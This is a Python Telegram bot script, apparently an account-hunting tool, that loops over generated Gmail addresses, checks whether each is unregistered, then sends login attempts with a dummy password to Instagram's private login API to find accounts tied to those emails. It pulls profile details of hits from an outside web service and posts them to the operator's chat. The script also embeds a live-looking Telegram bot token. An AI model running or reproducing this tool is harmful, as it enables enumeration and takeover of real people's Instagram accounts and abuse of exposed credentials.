import requests 
import telebot 
from telebot import types
import requests
from uuid import uuid4
from gdolib import *
import gdolib
from Nova_Tools import Tools
from TrackCobra import Valid
uid = uuid4()
tok ="5420949511:AAEQ3kRnqeOdPgVTsV2QrdhQK0FargrKOOk"
bot = telebot.TeleBot(tok)
srt = types.InlineKeyboardButton(text ="- HUNTR",callback_data = 'hun')
me = types.InlineKeyboardButton(text ="- TeLe ",url="https://t.me/IIlAndylII")
@bot.message_handler(commands=["start"])
def start(message):
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(srt,me)
    bot.send_message(message.chat.id,f"""HELO PRO {fr} TO BOT EMAIL INSTA OR FACEBOOK 
START EMAIL LITSCO HUNTR""",parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == "hun":
        li(call.message)
def li(message):
    gGod=0
    bad1=0
    bad2=0
    bad3=0
    Godg=0
    facedon=0
    bad=0
    fr = message.from_user.first_name
    while True:
        emaill=gdolib.gdo_drow.get_email()
        emaile=emaill.split("@")[0]+"@gmail.com"
        email=emaile
        user=email.split("@")[0]
        gmail = Tools.check_email_gmail(email)
        if str("'The resulting': 'True") in str(gmail):
            Godg+=1
            url='https://i.instagram.com/api/v1/accounts/login/'
            headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*',
                 'Cookie':'missing',
                 'Accept-Encoding':'gzip, deflate',
                 'Accept-Language':'en-US',
                 'X-IG-Capabilities':'3brTvw==',
                 'X-IG-Connection-Type':'WIFI',
                 'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
              'Host':'i.instagram.com'}
            data = {'uuid':uid,  'password':'@PATREKMOD',
              'username':email,
              'device_id':uid,
              'from_reg':'false',
              '_csrftoken':'missing',
              'login_attempt_countn':'0'}
            req= requests.post(url, headers=headers, data=data).json()
            if req['message'] == 'The password you entered is incorrect. Please try again.':
                gGod+=1
                urd=f"https://mohammed-9.herokuapp.com/?user={user}"
                red=requests.get(urd).json()
                name = red["NAME"]
                followers = red["FOLLOWERS"]
                private=red["PRIVATE"]
                id=red["ID"]
                bio=red["BIO"]
                posts=red["POSTS"]
                GDO =(f"""
⎙ ʜɪ ɴᴇᴡ ᴇᴍᴀɪʟ ɪɴsᴛᴀ ʙʏ ANDY ⌯
•━━━━━━━━━━━━━━━•
⌯ ɴᴀᴍᴇ » {name}
⌯ ᴜsᴇʀɴᴀᴍᴇ » {user}
⌯ ᴇᴍᴀɪʟ » {email}
⌯ ғᴏʟʟᴏᴡᴇʀs » {followers}
⌯ ɪᴅ » {id}
⌯ ʙɪᴏ » {bio}
⌯ ᴘᴏsᴛs » {posts}
⌯ ᴘʀɪvᴀᴛᴇ » {private}
⌯ 𝙻𝙸𝙽𝚔 » https://www.instagram.com/{user}
•━━━━━━━━━━━━━━━•
◔‌◔ ʙʏ » @IlCoderlI - @IIlAndylII .""")
                bot.send_message(message.chat.id,GDO)
            else:
                bad1+=1
        else:
            bad3+=1
            mees = types.InlineKeyboardMarkup(row_width=1)
            ba1=types.InlineKeyboardButton(f"Email : {email}",callback_data='b1')
            ba2=types.InlineKeyboardButton(f"God Insta: {gGod}",callback_data='b2')
            ba3=types.InlineKeyboardButton(f"God Gmail : {Godg}",callback_data='b3')
            ba5=types.InlineKeyboardButton(f"BaD Gmail : {bad3}",callback_data='b5')
            ba6=types.InlineKeyboardButton(f"Bad Insta : {bad1}",callback_data='b6')
            mees.add(ba1,ba2,ba3,ba5,ba6)
            bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="START HUNTR ....",parse_mode='markdown',reply_markup=mees) 
bot.polling()
